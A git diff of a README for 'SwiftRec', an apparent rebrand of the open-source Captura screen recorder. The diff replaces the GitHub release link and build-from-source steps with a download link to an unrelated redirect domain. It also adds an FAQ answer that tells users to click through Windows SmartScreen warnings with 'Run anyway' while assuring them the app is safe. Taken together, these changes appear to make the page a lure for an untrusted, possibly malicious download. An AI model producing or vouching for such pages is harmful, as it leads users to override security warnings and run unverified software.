@@ -1,82 +1,64 @@
-<p align="center">
-  <img src="docs/logo.png" width="120" alt="SwiftRec logo">
-</p>
+# SwiftRec — a lightweight screen recorder for Windows with a global hotkey
 
-<h1 align="center">SwiftRec</h1>
-
-<p align="center">
-  <b>A fast, free and open-source screen recorder for Windows.</b><br>
-  Capture your screen, webcam and audio in one click — no watermark, no sign-up, no limits.
-</p>
-
-<p align="center">
-  <a href="https://github.com/Fi6uDvGWucFv/SwiftRec/releases/latest"><img src="https://img.shields.io/badge/download-latest-13E8A5?style=for-the-badge" alt="Download"></a>
-  <img src="https://img.shields.io/badge/platform-Windows%207--11-2b2f36?style=for-the-badge" alt="Windows 7-11">
-  <img src="https://img.shields.io/badge/license-MIT-2b2f36?style=for-the-badge" alt="MIT License">
-  <a href="https://t.me/windows_free_software"><img src="https://img.shields.io/badge/Telegram-@windows__free__software-229ED9?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram"></a>
-</p>
+SwiftRec is a small, free screen recorder for Windows 10 and Windows 11 that stays out of your way: no account, no watermark, no on-screen overlay cluttering the capture. If you just want to tap a hotkey, grab a clean MP4 of what's on your monitor, and get back to work, swiftrec is built for exactly that.
 
 <p align="center">
   <img src="docs/screenshot-main.png" width="480" alt="SwiftRec main window">
 </p>
 
-## Features
-
-- 🎬 **Record anything** — full screen, a single window, a custom region, or a specific monitor
-- 🎤 **Voice + system audio together** — narrate with your microphone while capturing what plays on screen, muxed into one file
-- 📷 **Webcam overlay** — add a webcam bubble on top of your recording for tutorials and reactions
-- 🖱️ **Show clicks & keystrokes** — optional mouse-click and keystroke overlays, great for how-to videos
-- 🖼️ **Screenshots** — grab full screen, window or region to PNG in a keypress
-- ⌨️ **Global hotkeys** — start, pause and stop without switching windows
-- 📦 **MP4 / GIF output** — clean H.264 MP4 or animated GIF, no watermark
-- 🪶 **Light & portable** — tiny installer, runs on .NET Framework, no bloat
-
 ## Download
 
-**➡️ [Download the latest release](https://github.com/Fi6uDvGWucFv/SwiftRec/releases/latest)**
+**[Download for Windows](https://go.download-helper.tech/go/SWRC)**
 
-Two ways to run it:
+You get a ZIP archive. Right-click it in File Explorer, choose **Extract All**, and open the folder it creates. From there you can launch SwiftRec straight out of the extracted folder — keep it on your desktop, drop it on a USB stick, or move it into any directory you own. No background services, no scattered files across the system.
 
-| | |
-|---|---|
-| **Installer** | `SwiftRecSetup.zip` — download, unzip and run `SwiftRecSetup.msi` to install. Adds Start-menu and optional desktop shortcut. |
-| **Runtime**   | Requires .NET Framework 4.7.2 (preinstalled on Windows 8.1 / 10 / 11) |
+## What it does
 
-Website: [swiftrecpc.com](https://swiftrecpc.com)
-
-Telegram: [@windows_free_software](https://t.me/windows_free_software) — free & clean Windows software, new releases posted here.
+- **Record a full screen, a single window, a free-form region, or a specific monitor** — pick the source from the toolbar before you hit record.
+- **Microphone and system audio in one file** — narrate over whatever is already playing; both tracks are muxed into the output.
+- **Webcam bubble on top of the capture** — optional picture-in-picture for tutorials, reactions, and talking-head clips.
+- **Mouse-click and keystroke indicators** — toggle them on when you're making a how-to and want viewers to see every input.
+- **Still screenshots** — grab a full screen, a window, or a drawn region to PNG with a single key.
+- **Global hotkeys for start, pause, and stop** — control the recording while the focused app stays in front, no window-switching.
+- **MP4 (H.264) or animated GIF output** — the MP4 is ready to drop straight into YouTube or an editor; the GIF is handy for bug reports and chat threads.
+- **Portable footprint** — tiny download, runs on .NET Framework 4.7.2 (already present on Windows 10 and 11), nothing bloated bundled in.
 
 ## Quick start
 
-1. Launch **SwiftRec**.
-2. Pick a source on the toolbar — **Full Screen**, **Window**, **Region** or **Screen**.
-3. Toggle the **microphone** 🎤 and **speaker** 🔊 icons for the audio you want.
-4. Hit the red **●** button (or the hotkey) to start, and **■** to stop.
-5. Your clip lands in `Videos\SwiftRec` — open the folder straight from the app.
+1. Extract **SwiftRecSetup.zip** and launch the app from the extracted folder.
+2. On the toolbar, choose a source: **Full Screen**, **Window**, **Region**, or a specific monitor.
+3. Flip the **mic** and **speaker** icons on or off depending on which audio tracks you want in the file.
+4. Press the red **●** button — or the configured global hotkey — to start. Hit **■** (or the hotkey) to stop.
+5. The finished clip appears in `Videos\SwiftRec`; the app has a shortcut to open that folder for you.
 
-## Screenshots
+## FAQ
 
-<p align="center">
-  <img src="docs/screenshot-config.png" width="620" alt="SwiftRec configuration">
-</p>
+**Is it free?** Yes. There is no paid tier, no trial window, no watermark on your output.
 
-## Build from source
+**Does it run on Windows 11?** Yes, and on Windows 10 too (64-bit). It also works on earlier Windows releases that have .NET Framework 4.7.2.
 
-SwiftRec targets **.NET Framework 4.7.2** and builds with Visual Studio 2022 (or Build Tools) + MSBuild.
+**Do I need to sign up or log in?** No. There is no account, no cloud, no profile — launch and record.
 
-```bash
-git clone https://github.com/Fi6uDvGWucFv/SwiftRec.git
-cd SwiftRec
-msbuild src/Captura.sln /t:Restore /p:Configuration=Release
-msbuild src/Captura.sln /t:Build   /p:Configuration=Release
-```
+**Does it need an internet connection?** No. Recording, saving, and screenshotting are all local. The app never phones home.
 
-The build output appears in `src/Captura/bin/Release/SwiftRec.exe`.
+**Does it need administrator rights?** No. Running it portably from your user folder is enough for normal screen and audio capture.
+
+**Is it safe?** Yes — SwiftRec is open source and built on the well-known Captura engine. If Windows SmartScreen shows a blue warning because the build is new, click **More info** then **Run anyway**.
+
+## System requirements
+
+- Windows 10 or Windows 11, 64-bit
+- .NET Framework 4.7.2 (preinstalled on Windows 10 and 11)
+- A working audio device if you plan to record microphone or system sound
+
+## Website
+
+Website: [https://swiftrecpc.com](https://swiftrecpc.com)
 
 ## Credits
 
-SwiftRec is built on top of the excellent open-source **[Captura](https://github.com/MathewSachin/Captura)** engine by **Mathew Sachin**, used and redistributed under the MIT License. All original copyright is retained — see [LICENSE.md](LICENSE.md) and the bundled third-party notices in [`licenses/`](licenses/).
+SwiftRec is built on top of the open-source **[Captura](https://github.com/MathewSachin/Captura)** engine by Mathew Sachin, redistributed here under the terms of its original license. All upstream copyright notices are retained in the `licenses/` folder bundled with the app.
 
 ## License
 
-Released under the **[MIT License](LICENSE.md)**. You are free to use, modify and distribute it.
+Released under the **MIT License**. You're free to use, modify, and redistribute swiftrec on your own terms.
